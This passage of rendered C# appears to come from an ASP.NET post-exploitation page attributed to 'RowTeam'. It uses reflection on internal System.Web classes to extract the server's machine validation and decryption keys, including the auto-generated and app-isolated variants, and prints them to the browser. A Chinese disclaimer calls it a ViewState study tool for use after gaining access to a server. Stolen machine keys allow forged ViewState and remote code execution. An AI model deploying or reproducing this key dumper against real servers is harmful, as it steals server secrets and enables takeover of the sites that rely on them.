+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">systemWebAsm</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="s">&#34;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">machineKeySectionType</span> <span class="p">=</span> <span class="n">systemWebAsm</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Web.Configuration.MachineKeySection&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">getApplicationConfigMethod</span> <span class="p">=</span> <span class="n">machineKeySectionType</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetApplicationConfig&#34;</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">config</span> <span class="p">=</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Configuration</span><span class="p">.</span><span class="n">MachineKeySection</span><span class="p">)</span><span class="n">getApplicationConfigMethod</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;ValidationKey:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">ValidationKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;ValidationAlg:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">Validation</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;DecryptionKey:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">DecryptionKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;DecryptionAlg:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">Decryption</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;CompatibilityMode:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">CompatibilityMode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//==========================================================================</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">typeMachineKeyMasterKeyProvider</span> <span class="p">=</span> <span class="n">systemWebAsm</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Web.Security.Cryptography.MachineKeyMasterKeyProvider&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">instance</span> <span class="p">=</span> <span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">FullName</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">config</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span> <span class="p">},</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">validationKey</span> <span class="p">=</span> <span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetValidationKey&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">_validationKey</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span><span class="n">validationKey</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetKeyMaterial&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">validationKey</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">encryptionKey</span> <span class="p">=</span> <span class="n">typeMachineKeyMasterKeyProvider</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetEncryptionKey&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">_decryptionKey</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span><span class="n">validationKey</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetKeyMaterial&#34;</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">encryptionKey</span><span class="p">,</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//==========================================================================</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;b&gt;ASP.NET 4.0 and below:&lt;/b&gt;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">autogenKeys</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span><span class="k">typeof</span><span class="p">(</span><span class="n">HttpRuntime</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;s_autogenKeys&#34;</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span><span class="p">).</span><span class="n">GetValue</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">validationKeySize</span> <span class="p">=</span> <span class="m">64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">decryptionKeySize</span> <span class="p">=</span> <span class="m">24</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">validationKeyAuto</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">validationKeySize</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">decryptionKeyAuto</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">decryptionKeySize</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="p">.</span><span class="n">Buffer</span><span class="p">.</span><span class="n">BlockCopy</span><span class="p">(</span><span class="n">autogenKeys</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">validationKeyAuto</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">validationKeySize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="p">.</span><span class="n">Buffer</span><span class="p">.</span><span class="n">BlockCopy</span><span class="p">(</span><span class="n">autogenKeys</span><span class="p">,</span> <span class="n">validationKeySize</span><span class="p">,</span> <span class="n">decryptionKeyAuto</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">decryptionKeySize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">appName</span> <span class="p">=</span> <span class="n">HttpRuntime</span><span class="p">.</span><span class="n">AppDomainAppVirtualPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">appId</span> <span class="p">=</span> <span class="n">HttpRuntime</span><span class="p">.</span><span class="n">AppDomainAppId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;appName:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">appName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;appId:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">appId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;initial validationKey (not useful for direct use):&lt;/b&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">validationKeyAuto</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;initial decryptionKey (not useful for direct use):&lt;/b&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">decryptionKeyAuto</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">_validationKeyAutoAppSpecific</span> <span class="p">=</span> <span class="n">validationKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">dwCode3</span> <span class="p">=</span> <span class="n">StringComparer</span><span class="p">.</span><span class="n">InvariantCultureIgnoreCase</span><span class="p">.</span><span class="n">GetHashCode</span><span class="p">(</span><span class="n">appName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">2</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppSpecific</span><span class="p">[</span><span class="m">3</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;App specific ValidationKey (when uses IsolateApps):&lt;/b&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">_validationKeyAutoAppSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">_validationKeyAutoAppIdSpecific</span> <span class="p">=</span> <span class="n">validationKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">dwCode4</span> <span class="p">=</span> <span class="n">StringComparer</span><span class="p">.</span><span class="n">InvariantCultureIgnoreCase</span><span class="p">.</span><span class="n">GetHashCode</span><span class="p">(</span><span class="n">appId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">4</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">5</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">6</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_validationKeyAutoAppIdSpecific</span><span class="p">[</span><span class="m">7</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;AppId Auto specific ValidationKey (when uses IsolateByAppId):&lt;/b&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">_validationKeyAutoAppIdSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">_decryptionKeyAutoAutoAppSpecific</span> <span class="p">=</span> <span class="n">decryptionKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">2</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppSpecific</span><span class="p">[</span><span class="m">3</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode3</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;App specific DecryptionKey (when uses IsolateApps):&lt;/b&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">_decryptionKeyAutoAutoAppSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">_decryptionKeyAutoAutoAppIdSpecific</span> <span class="p">=</span> <span class="n">decryptionKeyAuto</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">4</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">5</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff00</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">6</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff0000</span><span class="p">)</span> <span class="p">&gt;&gt;</span> <span class="m">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_decryptionKeyAutoAutoAppIdSpecific</span><span class="p">[</span><span class="m">7</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)((</span><span class="n">dwCode4</span> <span class="p">&amp;</span> <span class="m">0xff000000</span><span class="p">)&gt;&gt;</span> <span class="m">24</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;AppId Auto specific DecryptionKey (when uses IsolateByAppId):&lt;/b&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">_decryptionKeyAutoAutoAppIdSpecific</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//==========================================================================</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;b&gt;ASP.NET 4.5 and above:&lt;/b&gt;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;validationAlg:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">Validation</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;validationKey:&lt;/b&gt;&#34;</span> <span class="p">+</span> <span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">_validationKey</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;decryptionAlg:&lt;/b&gt; &#34;</span> <span class="p">+</span> <span class="n">config</span><span class="p">.</span><span class="n">Decryption</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;b&gt;decryptionKey:&lt;/b&gt;&#34;</span> <span class="p">+</span> <span class="n">BitConverter</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">_decryptionKey</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">,</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">void</span> <span class="n">Page_load</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">ContentEncoding</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">Default</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;p style=&#39;color:#ff0000;text-align:center;&#39;&gt;获取 .NET 框架的机器密钥&lt;/p&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;p&gt;1. 本程序仅供实验学习 ASP.NET ViewState，请勿违法滥用！&lt;/p&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;p&gt;2. 适用场景：获取 .NET 框架权限后均适用！&lt;/p&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;p&gt;3. 公众号：RowTeam&lt;/p&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="s">&#34;&lt;br/&gt;&lt;hr/&gt;&#34;</span><span class="p">);</span>
